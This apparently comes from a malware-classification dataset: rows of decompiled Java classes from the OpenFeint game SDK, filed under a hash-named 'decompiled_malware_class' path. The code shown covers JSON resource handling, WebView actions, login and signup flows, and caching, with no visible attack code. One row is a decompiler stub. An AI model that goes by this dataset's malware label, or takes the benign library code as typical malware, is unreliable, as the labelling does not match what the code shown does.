"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.internal.resource\IntResourceProperty.code","public abstract class IntResourceProperty extends PrimitiveResourceProperty {   public abstract int get(  Resource resource);   public abstract void set(  Resource resource,  int i);   @Override public void copy(  Resource lhs,  Resource rhs){     set(lhs,get(rhs));   }   @Override public void parse(  Resource obj,  JsonParser jp) throws JsonParseException, IOException {     int value;     try {       value=jp.getIntValue();     }  catch (    Exception e) {       value=0;     }     set(obj,value);   }   @Override public void generate(  Resource obj,  JsonGenerator generator,  String key) throws JsonGenerationException, IOException {     generator.writeFieldName(key);     generator.writeNumber(get(obj));   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.internal.resource\LongResourceProperty.code","public abstract class LongResourceProperty extends PrimitiveResourceProperty {   public abstract long get(  Resource resource);   public abstract void set(  Resource resource,  long j);   @Override public void copy(  Resource lhs,  Resource rhs){     set(lhs,get(rhs));   }   @Override public void parse(  Resource obj,  JsonParser jp) throws JsonParseException, IOException {     set(obj,jp.getLongValue());   }   public void set(  Resource obj,  String val){     set(obj,Long.valueOf(val).longValue());   }   @Override public void generate(  Resource obj,  JsonGenerator generator,  String key) throws JsonGenerationException, IOException {     generator.writeFieldName(key);     generator.writeNumber(get(obj));   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.internal.resource\NestedResourceProperty.code","public abstract class NestedResourceProperty extends ResourceProperty {   private Class<? extends Resource> mType;   public abstract Resource get(  Resource resource);   public abstract void set(  Resource resource,  Resource resource2);   public NestedResourceProperty(  Class<? extends Resource> type){     this.mType=type;   }   public Class<? extends Resource> getType(){     return this.mType;   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.internal.resource\PrimitiveResourceProperty.code","public abstract class PrimitiveResourceProperty extends ResourceProperty {   public abstract void copy(  Resource resource,  Resource resource2);   public abstract void generate(  Resource resource,  JsonGenerator jsonGenerator,  String str) throws JsonGenerationException, IOException ;   public abstract void parse(  Resource resource,  JsonParser jsonParser) throws JsonParseException, IOException ; } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.internal.resource\Resource.code","public abstract class Resource {   private static final String TAG=""Resource"";   String mID;   private static HashMap<Class<? extends Resource>,ResourceClass> sSubclassMap=new HashMap<>();   private static HashMap<String,ResourceClass> sNameMap=new HashMap<>();   public String resourceID(){     return this.mID;   }   public void setResourceID(  String id){     this.mID=id;   } static {     registerSubclass(getResourceClass());     registerSubclass(ServerException.getResourceClass());     registerSubclass(ServerTimestamp.getResourceClass());     registerSubclass(BlobUploadParameters.getResourceClass());     registerSubclass(Achievement.getResourceClass());     registerSubclass(Leaderboard.getResourceClass());     registerSubclass(Score.getResourceClass());     registerSubclass(User.getResourceClass());     registerSubclass(CurrentUser.getResourceClass());   }   public static void registerSubclass(  ResourceClass klass){     sSubclassMap.put(klass.mObjectClass,klass);     if (klass.mResourceName != null) {       sNameMap.put(klass.mResourceName,klass);     }   }   public static ResourceClass getKlass(  Class<?> subclass){     return sSubclassMap.get(subclass);   }   public static ResourceClass getKlass(  String klassName){     return sNameMap.get(klassName);   }   public static ResourceClass getResourceClass(){     ResourceClass klass=new ResourceClass(Resource.class,null){       @Override public Resource factory(){         return null;       }     } ;     klass.mProperties.put(""id"",new StringResourceProperty(){       @Override public String get(      Resource obj){         return obj.mID;       }       @Override public void set(      Resource obj,      String val){         obj.mID=val;       }     } );     return klass;   }   public final void generateToStream(  OutputStream out) throws IOException {     JsonFactory jf=new JsonFactory();     JsonGenerator jg=jf.createJsonGenerator(out,JsonEncoding.UTF8);     generate(jg);     jg.close();   }   public final String generate(){     StringWriter sw=new StringWriter();     JsonFactory jf=new JsonFactory();     try {       JsonGenerator jg=jf.createJsonGenerator(sw);       generate(jg);       jg.close();       return sw.toString();     }  catch (    IOException e) {       OpenFeintInternal.log(TAG,e.getMessage());       return null;     }   }   public final void generate(  JsonGenerator generator) throws JsonGenerationException, IOException {     HashMap<String,Integer> r;     ResourceClass rc=getKlass(getClass());     generator.writeStartObject();     generator.writeFieldName(rc.mResourceName);     generator.writeStartObject();     for (    Map.Entry<String,ResourceProperty> e : rc.mProperties.entrySet()) {       ResourceProperty rp=e.getValue();       if (rp instanceof PrimitiveResourceProperty) {         ((PrimitiveResourceProperty)rp).generate(this,generator,e.getKey());       }  else       if (rp instanceof ArrayResourceProperty) {         ArrayResourceProperty arp=(ArrayResourceProperty)rp;         List<? extends Resource> resources=arp.get(this);         if (resources != null) {           generator.writeFieldName(e.getKey());           ResourceClass erc=getKlass(arp.elementType());           generator.writeStartObject();           generator.writeFieldName(String.valueOf(erc.mResourceName) + ""s"");           generator.writeStartArray();           Iterator<? extends Resource> it=resources.iterator();           while (it.hasNext()) {             it.next().generate(generator);           }           generator.writeEndArray();           generator.writeEndObject();         }       }  else       if (rp instanceof NestedResourceProperty) {         Resource r2=((NestedResourceProperty)rp).get(this);         if (r2 != null) {           generator.writeFieldName(e.getKey());           r2.generate(generator);         }       }  else       if ((rp instanceof HashIntResourceProperty) && (r=((HashIntResourceProperty)rp).get(this)) != null && r.size() > 0) {         generator.writeFieldName(e.getKey());         generator.writeStartObject();         for (        Map.Entry<String,Integer> entry : r.entrySet()) {           generator.writeFieldName(entry.getKey());           generator.writeNumber(entry.getValue().intValue());         }         generator.writeEndObject();       }     }     generator.writeEndObject();     generator.writeEndObject();   }   public final void shallowCopy(  Resource otherResource){     if (otherResource.getClass() != getClass()) {       throw new UnsupportedOperationException(""You can only shallowCopy the same type of resource"");     }     unguardedShallowCopy(otherResource);   }   public final void shallowCopyAncestorType(  Resource otherResource){     Class<?> c=getClass();     Class<?> o=otherResource.getClass();     if (o != Resource.class) {       while (c != o && c != Resource.class) {         c=c.getSuperclass();       }       if (c == Resource.class) {         throw new UnsupportedOperationException(String.valueOf(o.getName()) + "" is not a superclass of "" + getClass().getName());       }     }     unguardedShallowCopy(otherResource);   }   private final void unguardedShallowCopy(  Resource otherResource){     ResourceClass rc=getKlass(otherResource.getClass());     for (    Map.Entry<String,ResourceProperty> e : rc.mProperties.entrySet()) {       ResourceProperty rp=e.getValue();       if (rp instanceof PrimitiveResourceProperty) {         ((PrimitiveResourceProperty)rp).copy(this,otherResource);       }  else       if (rp instanceof ArrayResourceProperty) {         ((ArrayResourceProperty)rp).set(this,((ArrayResourceProperty)rp).get(otherResource));       }  else       if (rp instanceof NestedResourceProperty) {         ((NestedResourceProperty)rp).set(this,((NestedResourceProperty)rp).get(otherResource));       }     }   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.internal.resource\ResourceClass.code","public abstract class ResourceClass {   public Class<? extends Resource> mObjectClass;   public HashMap<String,ResourceProperty> mProperties=new HashMap<>();   public String mResourceName;   public abstract Resource factory();   private void mixinParentProperties(  Class<?> objectClass){     if (objectClass != Resource.class) {       Class<?> superClass=objectClass.getSuperclass();       mixinParentProperties(superClass);       ResourceClass klass=Resource.getKlass(superClass);       for (      String propName : klass.mProperties.keySet()) {         this.mProperties.put(propName,klass.mProperties.get(propName));       }     }   }   public ResourceClass(  Class<? extends Resource> objectClass,  String resourceName){     this.mObjectClass=objectClass;     this.mResourceName=resourceName;     mixinParentProperties(objectClass);   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.internal.resource\ResourceProperty.code","public abstract class ResourceProperty { } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.internal.resource\ScoreBlobDelegate.code","public final class ScoreBlobDelegate {   public static Score.BlobDownloadedDelegate sBlobDownloadedDelegate=null;   public static final void notifyBlobDownloaded(  Score score){     if (sBlobDownloadedDelegate != null && score.blob != null) {       sBlobDownloadedDelegate.blobDownloadedForScore(score);     }   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.internal.resource\ServerException.code","public class ServerException extends Resource {   public String exceptionClass;   public String message;   public boolean needsDeveloperAttention;   public ServerException(  String klass,  String message){     this.exceptionClass=klass;     this.message=message;   }   public ServerException(){   }   public static ResourceClass getResourceClass(){     ResourceClass klass=new ResourceClass(ServerException.class,""exception""){       @Override public Resource factory(){         return new ServerException();       }     } ;     klass.mProperties.put(""class"",new StringResourceProperty(){       @Override public String get(      Resource obj){         return ((ServerException)obj).exceptionClass;       }       @Override public void set(      Resource obj,      String val){         ((ServerException)obj).exceptionClass=val;       }     } );     klass.mProperties.put(""message"",new StringResourceProperty(){       @Override public String get(      Resource obj){         return ((ServerException)obj).message;       }       @Override public void set(      Resource obj,      String val){         ((ServerException)obj).message=val;       }     } );     klass.mProperties.put(""needs_developer_attention"",new BooleanResourceProperty(){       @Override public boolean get(      Resource obj){         return ((ServerException)obj).needsDeveloperAttention;       }       @Override public void set(      Resource obj,      boolean val){         ((ServerException)obj).needsDeveloperAttention=val;       }     } );     return klass;   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.internal.resource\StringResourceProperty.code","public abstract class StringResourceProperty extends PrimitiveResourceProperty {   public abstract String get(  Resource resource);   public abstract void set(  Resource resource,  String str);   @Override public void copy(  Resource lhs,  Resource rhs){     set(lhs,get(rhs));   }   @Override public void parse(  Resource obj,  JsonParser jp) throws JsonParseException, IOException {     if (jp.getCurrentToken() == JsonToken.VALUE_NULL) {       set(obj,null);     }  else {       set(obj,jp.getText());     }   }   @Override public void generate(  Resource obj,  JsonGenerator generator,  String key) throws JsonGenerationException, IOException {     String o=get(obj);     if (o != null) {       generator.writeFieldName(key);       generator.writeString(o);     }   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.internal.ui\ActionHandler.code","public class ActionHandler {   private static final String WEBUI_PREFS=""OFWebUI"";   private static final String WEBUI_SETTING_PREFIX=""OFWebUISetting_"";   List<String> mActionList=new ArrayList();   WebNav mWebNav;   protected List<String> getActionList(){     return this.mActionList;   }   public ActionHandler(  WebNav webNav){     this.mWebNav=webNav;     populateActionList(this.mActionList);   }   public void populateActionList(  List<String> actionList){     actionList.add(""log"");     actionList.add(""apiRequest"");     actionList.add(""contentLoaded"");     actionList.add(""startLoading"");     actionList.add(""back"");     actionList.add(""showLoader"");     actionList.add(""hideLoader"");     actionList.add(""alert"");     actionList.add(""dismiss"");     actionList.add(""openMarket"");     actionList.add(""isApplicationInstalled"");     actionList.add(""openYoutubePlayer"");     actionList.add(""profilePicture"");     actionList.add(""openBrowser"");     actionList.add(""downloadBlob"");     actionList.add(""dashboard"");     actionList.add(""readSetting"");     actionList.add(""writeSetting"");   }   public void dispatch(  Uri uri){     if (uri.getHost().equals(""action"")) {       Map<String,Object> options=parseQueryString(uri);       String actionName=uri.getPath().replaceFirst(""/"","""");       if (!actionName.equals(""log"")) {         Map<String,Object> escapedOptions=new HashMap<>(options);         String params=(String)options.get(""params"");         if (params != null && params.contains(""password"")) {           escapedOptions.put(""params"",""---FILTERED---"");         }         OpenFeintInternal.log(WebNav.TAG,""ACTION: "" + actionName + "" ""+ escapedOptions.toString());       }       if (this.mActionList.contains(actionName)) {         try {           getClass().getMethod(actionName,Map.class).invoke(this,options);           return;         }  catch (        NoSuchMethodException e) {           OpenFeintInternal.log(WebNav.TAG,""mActionList contains this method, but it is not implemented: "" + actionName);           return;         } catch (        Exception e2) {           OpenFeintInternal.log(WebNav.TAG,""Unhandled Exception: "" + e2.toString() + ""   ""+ e2.getCause());           return;         }       }       OpenFeintInternal.log(WebNav.TAG,""UNHANDLED ACTION: "" + actionName);       return;     }     OpenFeintInternal.log(WebNav.TAG,""UNHANDLED MESSAGE TYPE: "" + uri.getHost());   }   private Map<String,Object> parseQueryString(  Uri uri){     return parseQueryString(uri.getEncodedQuery());   }   private Map<String,Object> parseQueryString(  String queryString){     Map<String,Object> options=new HashMap<>();     if (queryString != null) {       String[] pairs=queryString.split(""&"");       for (      String stringPair : pairs) {         String[] pair=stringPair.split(""="");         if (pair.length == 2) {           options.put(pair[0],Uri.decode(pair[1]));         }  else {           options.put(pair[0],null);         }       }     }     return options;   }   public void apiRequest(  Map<String,String> options){     final String requestID=options.get(""request_id"");     Map<String,Object> params=parseQueryString(options.get(""params""));     Map<String,Object> httpParams=parseQueryString(options.get(""httpParams""));     OpenFeintInternal.genericRequest(options.get(""path""),options.get(""method""),params,httpParams,new IRawRequestDelegate(){       @Override public void onResponse(      int statusCode,      String responseBody){         String response=responseBody.trim();         if (response.length() == 0) {           response=""{}"";         }         String js=String.format(""OF.api.completeRequest(\""%s\"", \""%d\"", %s)"",requestID,Integer.valueOf(statusCode),response);         ActionHandler.this.mWebNav.executeJavascript(js);       }     } );   }   public void contentLoaded(  Map<String,String> options){     if (options.get(""keepLoader"") == null || !options.get(""keepLoader"").equals(""true"")) {       hideLoader(null);       WebNav.this.setTitle(options.get(""title""));     }     this.mWebNav.fade(true);     WebNav.this.dismissDialog();   }   public void startLoading(  Map<String,String> options){     this.mWebNav.fade(false);     showLoader(null);     WebViewCache.trackPath(options.get(""path""),new WebViewCacheCallback(){       @Override public void pathLoaded(      String itemPath){         WebNav.this.executeJavascript(""OF.navigateToUrlCallback()"");       }       @Override public void failLoaded(){         WebNav.this.closeForDiskError();       }       @Override public void onTrackingNeeded(){         WebNav.this.showDialog();       }     } );     this.mWebNav.pageStackCount++;   }   public void back(  Map<String,String> options){     this.mWebNav.fade(false);     String root=options.get(""root"");     if (root != null && !root.equals(""false"")) {       this.mWebNav.pageStackCount=1;     }     if (this.mWebNav.pageStackCount > 1) {       this.mWebNav.pageStackCount--;     }   }   public void showLoader(  Map<String,String> options){   }   public void hideLoader(  Map<String,String> options){   }   public void log(  Map<String,String> options){     String message=options.get(""message"");     if (message != null) {       OpenFeintInternal.log(WebNav.TAG,""WEBLOG: "" + options.get(""message""));     }   }   public void alert(  Map<String,String> options){     AlertDialog.Builder builder=new AlertDialog.Builder(this.mWebNav);     builder.setTitle(options.get(""title""));     builder.setMessage(options.get(""message""));     builder.setNegativeButton(OpenFeintInternal.getRString(R.string.of_ok),(DialogInterface.OnClickListener)null);     builder.show();   }   public void dismiss(  Map<String,String> options){     WebNav.this.finish();   }   public void openMarket(  Map<String,String> options){     String packageName=options.get(""package_name"");     Intent intent=new Intent(""android.intent.action.VIEW"",Uri.parse(""market://details?id="" + packageName));     this.mWebNav.startActivity(intent);   }   public void isApplicationInstalled(  Map<String,String> options){     boolean installed=false;     PackageManager manager=this.mWebNav.getPackageManager();     List<ApplicationInfo> installedApps=manager.getInstalledApplications(0);     String searchString=options.get(""package_name"");     for (    ApplicationInfo info : installedApps) {       if (info.packageName.equals(searchString)) {         installed=true;       }     }     WebNav webNav=WebNav.this;     Object[] objArr=new Object[2];     objArr[0]=options.get(""callback"");     objArr[1]=installed ? ""true"" : ""false"";     webNav.executeJavascript(String.format(""%s(%s)"",objArr));   }   public void openYoutubePlayer(  Map<String,String> options){     String videoID=options.get(""video_id"");     Intent intent=new Intent(""android.intent.action.VIEW"",Uri.parse(""vnd.youtube:"" + videoID));     List<ResolveInfo> list=WebNav.this.getPackageManager().queryIntentActivities(intent,65536);     if (list.size() == 0) {       Toast.makeText(this.mWebNav,OpenFeintInternal.getRString(R.string.of_no_video),0).show();     }  else {       this.mWebNav.startActivity(intent);     }   }   public final void profilePicture(  Map<String,String> options){     ImagePicker.show(WebNav.this);   }   public void openBrowser(  Map<String,String> options){     Intent browserIntent=new Intent(this.mWebNav,(Class<?>)NativeBrowser.class);     WebNav.this.mNativeBrowserParameters=new HashMap();     for (    String arg : new String[]{""src"",""callback"",""on_cancel"",""on_failure"",""timeout""}) {       String val=options.get(arg);       if (val != null) {         WebNav.this.mNativeBrowserParameters.put(arg,val);         browserIntent.putExtra(NativeBrowser.INTENT_ARG_PREFIX + arg,val);       }     }     WebNav.this.startActivityForResult(browserIntent,WebNav.REQUEST_CODE_NATIVE_BROWSER);   }   public void downloadBlob(  Map<String,String> options){     String scoreJSON=options.get(""score"");     final String onError=options.get(""onError"");     final String onSuccess=options.get(""onSuccess"");     try {       JsonFactory jsonFactory=new JsonFactory();       JsonParser jp=jsonFactory.createJsonParser(new StringReader(scoreJSON));       JsonResourceParser jrp=new JsonResourceParser(jp);       Object scoreObject=jrp.parse();       if (scoreObject != null && (scoreObject instanceof Score)) {         final Score score=(Score)scoreObject;         score.downloadBlob(new Score.DownloadBlobCB(){           @Override public void onSuccess(){             if (onSuccess != null) {               WebNav.this.executeJavascript(String.format(""%s()"",onSuccess));             }             ScoreBlobDelegate.notifyBlobDownloaded(score);           }           @Override public void onFailure(          String exceptionMessage){             if (onError != null) {               WebNav.this.executeJavascript(String.format(""%s(%s)"",onError,exceptionMessage));             }           }         } );       }     }  catch (    Exception e) {       if (onError != null) {         WebNav.this.executeJavascript(String.format(""%s(%s)"",onError,e.getLocalizedMessage()));       }     }   }   public void dashboard(  Map<String,String> options){     Dashboard.openFromSpotlight();   }   public void readSetting(  Map<String,String> options){     String k=options.get(""key"");     String cb=options.get(""callback"");     if (cb != null) {       String key=k != null ? WEBUI_SETTING_PREFIX + k : null;       SharedPreferences prefs=OpenFeintInternal.getInstance().getContext().getSharedPreferences(WEBUI_PREFS,0);       String val=prefs.getString(key,null);       OpenFeintInternal.log(WebNav.TAG,String.format(""readSetting(%s) => %s"",k,val));       WebNav webNav=WebNav.this;       Object[] objArr=new Object[2];       objArr[0]=cb;       objArr[1]=val != null ? val : ""null"";       webNav.executeJavascript(String.format(""%s(%s)"",objArr));     }   }   public void writeSetting(  Map<String,String> options){     String k=options.get(""key"");     String v=options.get(""value"");     if (k != null && v != null) {       String key=WEBUI_SETTING_PREFIX + k;       SharedPreferences.Editor editor=OpenFeintInternal.getInstance().getContext().getSharedPreferences(WEBUI_PREFS,0).edit();       editor.putString(key,v);       editor.commit();     }   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.internal.ui\IntroFlow.code","public class IntroFlow extends WebNav {   Bitmap cachedImage;   @Override protected String initialContentPath(){     String contentName=getIntent().getStringExtra(""content_name"");     return contentName != null ? ""intro/"" + contentName : ""intro/index"";   }   @Override public void onActivityResult(  int requestCode,  int resultCode,  Intent returnedIntent){     if (ImagePicker.isImagePickerActivityResult(requestCode)) {       this.cachedImage=ImagePicker.onImagePickerActivityResult(this,resultCode,152,returnedIntent);     }   }   @Override protected WebNav.ActionHandler createActionHandler(  WebNav webNav){     return new IntroFlowActionHandler(webNav);   } private class IntroFlowActionHandler extends WebNav.ActionHandler {     public IntroFlowActionHandler(    WebNav webNav){       super(webNav);     }     @Override protected void populateActionList(    List<String> actionList){       super.populateActionList(actionList);       actionList.add(""createUser"");       actionList.add(""loginUser"");       actionList.add(""cacheImage"");       actionList.add(""uploadImage"");       actionList.add(""clearImage"");       actionList.add(""decline"");       actionList.add(""getEmail"");     }     public final void createUser(    final Map<String,String> options){       OpenFeintInternal.getInstance().createUser(options.get(""name""),options.get(""email""),options.get(""password""),options.get(""password_confirmation""),new IRawRequestDelegate(){         @Override public void onResponse(        int status,        String response){           String js=String.format(""%s('%d', %s)"",options.get(""callback""),Integer.valueOf(status),response.trim());           IntroFlowActionHandler.this.mWebNav.executeJavascript(js);         }       } );     }     public final void loginUser(    final Map<String,String> options){       OpenFeintInternal.getInstance().loginUser(options.get(""email""),options.get(""password""),options.get(""user_id""),new IRawRequestDelegate(){         @Override public void onResponse(        int status,        String response){           String js=String.format(""%s('%d', %s)"",options.get(""callback""),Integer.valueOf(status),response.trim());           IntroFlowActionHandler.this.mWebNav.executeJavascript(js);         }       } );     }     public final void cacheImage(    Map<String,String> options){       ImagePicker.show(IntroFlow.this);     }     public final void uploadImage(    Map<String,String> options){       if (IntroFlow.this.cachedImage != null) {         String apiUrl=""/xp/users/"" + OpenFeintInternal.getInstance().getCurrentUser().resourceID() + ""/profile_picture"";         ImagePicker.compressAndUpload(IntroFlow.this.cachedImage,apiUrl,null);       }     }     public final void clearImage(    Map<String,String> options){       IntroFlow.this.cachedImage=null;     }     public void decline(    Map<String,String> options){       OpenFeint.userDeclinedFeint();       IntroFlow.this.finish();     }     public void getEmail(    Map<String,String> options){       String account=Util5.getAccountNameEclair(IntroFlow.this);       if (account != null) {         IntroFlow.this.executeJavascript(String.format(""%s('%s');"",options.get(""callback""),account));       }     }   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.internal.ui\IntroFlowActionHandler.code","private class IntroFlowActionHandler extends WebNav.ActionHandler {   public IntroFlowActionHandler(  WebNav webNav){     super(webNav);   }   @Override protected void populateActionList(  List<String> actionList){     super.populateActionList(actionList);     actionList.add(""createUser"");     actionList.add(""loginUser"");     actionList.add(""cacheImage"");     actionList.add(""uploadImage"");     actionList.add(""clearImage"");     actionList.add(""decline"");     actionList.add(""getEmail"");   }   public final void createUser(  final Map<String,String> options){     OpenFeintInternal.getInstance().createUser(options.get(""name""),options.get(""email""),options.get(""password""),options.get(""password_confirmation""),new IRawRequestDelegate(){       @Override public void onResponse(      int status,      String response){         String js=String.format(""%s('%d', %s)"",options.get(""callback""),Integer.valueOf(status),response.trim());         IntroFlowActionHandler.this.mWebNav.executeJavascript(js);       }     } );   }   public final void loginUser(  final Map<String,String> options){     OpenFeintInternal.getInstance().loginUser(options.get(""email""),options.get(""password""),options.get(""user_id""),new IRawRequestDelegate(){       @Override public void onResponse(      int status,      String response){         String js=String.format(""%s('%d', %s)"",options.get(""callback""),Integer.valueOf(status),response.trim());         IntroFlowActionHandler.this.mWebNav.executeJavascript(js);       }     } );   }   public final void cacheImage(  Map<String,String> options){     ImagePicker.show(IntroFlow.this);   }   public final void uploadImage(  Map<String,String> options){     if (IntroFlow.this.cachedImage != null) {       String apiUrl=""/xp/users/"" + OpenFeintInternal.getInstance().getCurrentUser().resourceID() + ""/profile_picture"";       ImagePicker.compressAndUpload(IntroFlow.this.cachedImage,apiUrl,null);     }   }   public final void clearImage(  Map<String,String> options){     IntroFlow.this.cachedImage=null;   }   public void decline(  Map<String,String> options){     OpenFeint.userDeclinedFeint();     IntroFlow.this.finish();   }   public void getEmail(  Map<String,String> options){     String account=Util5.getAccountNameEclair(IntroFlow.this);     if (account != null) {       IntroFlow.this.executeJavascript(String.format(""%s('%s');"",options.get(""callback""),account));     }   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.internal.ui\ItemAndCallback.code","public static class ItemAndCallback {   public final WebViewCacheCallback callback;   public final ManifestItem item;   public ItemAndCallback(  ManifestItem _item,  WebViewCacheCallback _cb){     this.item=_item;     this.callback=_cb;   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.internal.ui\JSInterface.code","public final class JSInterface {   public JSInterface(){   }   public void returnValue(  final String returnValue){     NativeBrowser.this.runOnUiThread(new Runnable(){       @Override public void run(){         if (NativeBrowser.this.mFinished.compareAndSet(false,true)) {           Intent returnIntent=new Intent();           if (returnValue != null) {             returnIntent.putExtra(""com.openfeint.internal.ui.NativeBrowser.argument.result"",returnValue);           }           NativeBrowser.this.setResult(-1,returnIntent);           NativeBrowser.this.finish();         }       }     } );   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.internal.ui\ManifestData.code","!org.eclipse.jdt.core.dom.TypeDeclaration@2a83a50"
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.internal.ui\ManifestItem.code","public static class ManifestItem {   public Set<String> dependentObjects;   public String hash;   public String path;   ManifestItem(  String _path,  String _hash){     this.path=_path;     this.hash=_hash;     this.dependentObjects=new HashSet();   }   ManifestItem(  ManifestItem item){     this.path=item.path;     this.dependentObjects=new HashSet(item.dependentObjects);   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.internal.ui\ManifestRequest.code","public class ManifestRequest extends CacheRequest {   private ManifestData data;   public ManifestRequest(  String key){     super(key);     this.data=null;   }   @Override public boolean signed(){     return false;   }   @Override public String path(){     return WebViewCache.getManifestPath(WebViewCache.this.appContext);   }   @Override public void onResponse(  int responseCode,  byte[] body){   }   @Override public void onResponseOffMainThread(  int responseCode,  byte[] body){     if (responseCode == 200) {       try {         this.data=new ManifestData(body);       }  catch (      Exception e) {         OpenFeintInternal.log(WebViewCache.TAG,e.toString());       }     }  else {       try {         this.data=new ManifestData(DB.storeHelper.getReadableDatabase());       }  catch (      Exception e2) {         OpenFeintInternal.log(WebViewCache.TAG,e2.toString());       }     }     if (this.data == null || this.data.objects.isEmpty()) {       this.data=null;       new BaseRequest(){         @Override public String method(){           return ""GET"";         }         @Override public String path(){           return ManifestRequest.this.path();         }         @Override public void onResponse(        int responseCode2,        byte[] body2){         }         @Override public void onResponseOffMainThread(        int responseCode2,        byte[] body2){           if (200 == responseCode2) {             try {               ManifestRequest.this.data=new ManifestData(body2);               ManifestRequest.this.finishManifest();               ManifestRequest.this.updateLastModifiedFromResponse(getResponse());               return;             }  catch (            Exception e3) {               return;             }           }           OpenFeintInternal.log(TAG,""finishWithoutLoading "" + responseCode2);           WebViewCache.this.finishWithoutLoading();         }       } .launch();     }  else {       finishManifest();       updateLastModifiedFromResponse(getResponse());     }   }   public void finishManifest(){     if (this.data != null) {       try {         this.data.saveTo(DB.storeHelper.getWritableDatabase());       }  catch (      Exception e) {         OpenFeintInternal.log(WebViewCache.TAG,e.toString());       }       Message msg=Message.obtain(WebViewCache.this.mHandler,0,this.data);       msg.sendToTarget();       return;     }     WebViewCache.this.finishWithoutLoading();   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.internal.ui\NativeBrowser.code","public class NativeBrowser extends NestedWindow {   public static final String INTENT_ARG_PREFIX=""com.openfeint.internal.ui.NativeBrowser.argument."";   private AtomicBoolean mFinished=new AtomicBoolean(false);   private Handler mHandler;   private Runnable mTimeoutWatchdog; public final class JSInterface {     public JSInterface(){     }     public void returnValue(    final String returnValue){       NativeBrowser.this.runOnUiThread(new Runnable(){         @Override public void run(){           if (NativeBrowser.this.mFinished.compareAndSet(false,true)) {             Intent returnIntent=new Intent();             if (returnValue != null) {               returnIntent.putExtra(""com.openfeint.internal.ui.NativeBrowser.argument.result"",returnValue);             }             NativeBrowser.this.setResult(-1,returnIntent);             NativeBrowser.this.finish();           }         }       } );     }   }   @Override public void onCreate(  Bundle savedInstanceState){     super.onCreate(savedInstanceState);     Bundle extras=getIntent().getExtras();     String src=extras.getString(""com.openfeint.internal.ui.NativeBrowser.argument.src"");     String timeout=extras.getString(""com.openfeint.internal.ui.NativeBrowser.argument.timeout"");     this.mWebView.getSettings().setJavaScriptEnabled(true);     this.mWebView.addJavascriptInterface(new JSInterface(),""NativeBrowser"");     this.mWebView.setWebViewClient(new WebViewClient(){       private void clearTimeout(){         if (NativeBrowser.this.mHandler != null && NativeBrowser.this.mTimeoutWatchdog != null) {           NativeBrowser.this.mHandler.removeCallbacks(NativeBrowser.this.mTimeoutWatchdog);           NativeBrowser.this.mHandler=null;           NativeBrowser.this.mTimeoutWatchdog=null;         }       }       @Override public void onPageFinished(      WebView view,      String url){         clearTimeout();         super.onPageFinished(view,url);       }       @Override public void onReceivedError(      WebView view,      int errorCode,      String description,      String failingUrl){         clearTimeout();         super.onReceivedError(view,errorCode,description,failingUrl);         Intent returnIntent=new Intent();         returnIntent.putExtra(""com.openfeint.internal.ui.NativeBrowser.argument.failed"",true);         returnIntent.putExtra(""com.openfeint.internal.ui.NativeBrowser.argument.failure_code"",errorCode);         returnIntent.putExtra(""com.openfeint.internal.ui.NativeBrowser.argument.failure_desc"",description);         NativeBrowser.this.setResult(-1,returnIntent);         NativeBrowser.this.finish();       }     } );     this.mWebView.setWebChromeClient(new WebChromeClient());     this.mWebView.loadUrl(src);     if (timeout != null) {       this.mHandler=new Handler();       this.mTimeoutWatchdog=new Runnable(){         @Override public void run(){           if (NativeBrowser.this.mFinished.compareAndSet(false,true)) {             Intent returnIntent=new Intent();             returnIntent.putExtra(""com.openfeint.internal.ui.NativeBrowser.argument.failed"",true);             returnIntent.putExtra(""com.openfeint.internal.ui.NativeBrowser.argument.failure_code"",0);             returnIntent.putExtra(""com.openfeint.internal.ui.NativeBrowser.argument.failure_desc"",""Timeout"");             NativeBrowser.this.setResult(-1,returnIntent);             NativeBrowser.this.finish();           }         }       } ;       this.mHandler.postDelayed(this.mTimeoutWatchdog,Integer.parseInt(timeout));     }     fade(true);   } } "
